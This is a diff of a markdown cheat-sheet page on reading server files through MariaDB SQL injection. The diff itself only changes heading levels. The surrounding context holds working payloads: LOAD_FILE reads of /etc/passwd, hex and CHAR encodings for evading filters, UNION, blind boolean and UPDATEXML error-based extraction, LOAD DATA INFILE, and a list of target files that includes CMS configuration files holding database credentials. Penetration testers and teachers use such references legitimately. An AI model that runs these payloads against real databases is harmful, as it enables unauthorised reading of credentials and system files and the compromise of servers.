@@ -7,11 +7,9 @@ tags: ["file operations", "load_file", "privilege escalation"]
 lastUpdated: 2025-12-18
 ---
 
-## Reading Files
-
 MariaDB provides functionality to read files from the server's filesystem, which can be exploited during SQL injection attacks if the database user has sufficient privileges.
 
-### Prerequisites
+## Prerequisites
 
 To read files from the MariaDB server, the following conditions must be met:
 
@@ -36,7 +34,7 @@ SELECT @@max_allowed_packet AS max_size
 -- Default is typically 16MB in MariaDB
 ```
 
-### LOAD_FILE() Function
+## LOAD_FILE() Function
 
 The primary method for reading files is the `LOAD_FILE()` function:
 
@@ -46,7 +44,7 @@ SELECT LOAD_FILE('/etc/passwd');
 
 This function returns the file contents as a string or NULL if the file doesn't exist or isn't readable.
 
-#### Hex Encoding to Bypass Filters
+### Hex Encoding to Bypass Filters
 
 Use hex encoding to avoid quote filters:
 
@@ -65,7 +63,7 @@ SELECT HEX('/etc/passwd') AS hex_path
 -- Returns: 2F6574632F706173737764
 ```
 
-#### CHAR() Function for Path Construction
+### CHAR() Function for Path Construction
 
 Build paths character by character to bypass filters:
 
@@ -80,7 +78,7 @@ SELECT LOAD_FILE(CHAR(47,101,116,99,47,112,97,115,115,119,100))
 
 > **Note:** See [Privileges](/mariadb/privileges) for detailed FILE privilege checking queries.
 
-### Important Target Files
+## Important Target Files
 
 Common valuable files to read:
 
@@ -100,9 +98,9 @@ Common valuable files to read:
 | `/var/log/mysql/error.log`           | MariaDB error logs                         |
 | `/proc/version`                      | Kernel version information                 |
 
-### Advanced Techniques
+## Advanced Techniques
 
-#### Reading Binary Files
+### Reading Binary Files
 
 Binary files can be read and converted to hexadecimal or Base64:
 
@@ -117,7 +115,7 @@ SELECT TO_BASE64(LOAD_FILE('/etc/passwd')) AS b64_content
 SELECT LENGTH(LOAD_FILE('/etc/passwd')) AS file_size
 ```
 
-#### Determining Web Root Path
+### Determining Web Root Path
 
 If you don't know the web server's document root:
 
@@ -142,7 +140,7 @@ SELECT
 -- Returns the first matching web root path or 'unknown'
 ```
 
-#### Dealing with Unknown File Paths
+### Dealing with Unknown File Paths
 
 If exact path is unknown, try multiple possible locations using CONCAT:
 
@@ -159,7 +157,7 @@ SELECT COALESCE(
 ) AS config_contents;
 ```
 
-#### Reading System Information
+### Reading System Information
 
 ```sql
 -- Get /etc/passwd to identify users
@@ -175,9 +173,9 @@ SELECT LOAD_FILE('/proc/version');
 SELECT LOAD_FILE('/etc/resolv.conf');
 ```
 
-### Practical Examples
+## Practical Examples
 
-#### Reading Database Configuration
+### Reading Database Configuration
 
 ```sql
 -- Check for common configuration files
@@ -187,9 +185,9 @@ SELECT LOAD_FILE('/var/www/html/configuration.php');   -- Joomla
 SELECT LOAD_FILE('/var/www/html/sites/default/settings.php');  -- Drupal
 ```
 
-### Injection Context Examples
+## Injection Context Examples
 
-#### UNION-Based File Reading
+### UNION-Based File Reading
 
 ```sql
 -- Extract file content via UNION injection
@@ -201,7 +199,7 @@ SELECT id, username FROM users WHERE id = 999
 UNION SELECT 1, LOAD_FILE(0x2F6574632F686F737473)
 ```
 
-#### Subquery-Based Extraction
+### Subquery-Based Extraction
 
 ```sql
 -- File content as subquery
@@ -211,7 +209,7 @@ SELECT (SELECT LOAD_FILE('/etc/passwd')) AS content
 SELECT IF(LOAD_FILE('/etc/passwd') IS NOT NULL, 'exists', 'not_found') AS result
 ```
 
-### Boolean-Based Detection
+## Boolean-Based Detection
 
 For blind injection when direct output isn't visible:
 
@@ -232,7 +230,7 @@ SELECT IF(ASCII(SUBSTRING(LOAD_FILE('/etc/passwd'), 1, 1)) > 100, 1, 0) AS is_ab
 -- Allows narrowing down character values in log2(256) = 8 queries
 ```
 
-### System Variables for Path Discovery
+## System Variables for Path Discovery
 
 MariaDB provides system variables that reveal useful paths:
 
@@ -259,7 +257,7 @@ SELECT @@log_bin_basename AS binlog_base
 SELECT CONCAT(@@datadir, 'mysql/user.MYD') AS user_data_file
 ```
 
-### LOAD DATA INFILE Alternative
+## LOAD DATA INFILE Alternative
 
 An alternative to `LOAD_FILE()` that loads file content into a table:
 
@@ -277,7 +275,7 @@ SELECT * FROM temp_file
 DROP TEMPORARY TABLE temp_file
 ```
 
-#### LOAD DATA LOCAL INFILE
+### LOAD DATA LOCAL INFILE
 
 Reads files from the client machine instead of the server:
 
@@ -288,7 +286,7 @@ LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE temp_file
 
 **Note:** `LOCAL` variant is often disabled via `local_infile` setting.
 
-### Error-Based File Extraction
+## Error-Based File Extraction
 
 Extract file content through error messages:
 
@@ -303,7 +301,7 @@ SELECT UPDATEXML(1, CONCAT(0x7e, SUBSTRING(LOAD_FILE('/etc/passwd'), 1, 30), 0x7
 SELECT UPDATEXML(1, CONCAT(0x7e, SUBSTRING(LOAD_FILE('/etc/passwd'), 31, 30), 0x7e), 1)
 ```
 
-### File Size Limitations
+## File Size Limitations
 
 ```sql
 -- Check maximum file size that can be read
@@ -328,7 +326,7 @@ SELECT SUBSTRING(LOAD_FILE('/etc/passwd'), 1001, 1000) AS chunk_2
 -- Continue until total_size is reached
 ```
 
-### Security Considerations
+## Security Considerations
 
 The `FILE` privilege has important characteristics:
 
@@ -343,7 +341,7 @@ WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'")
 AND privilege_type = 'FILE'
 ```
 
-### Mitigation
+## Mitigation
 
 To prevent unauthorized file access:
 
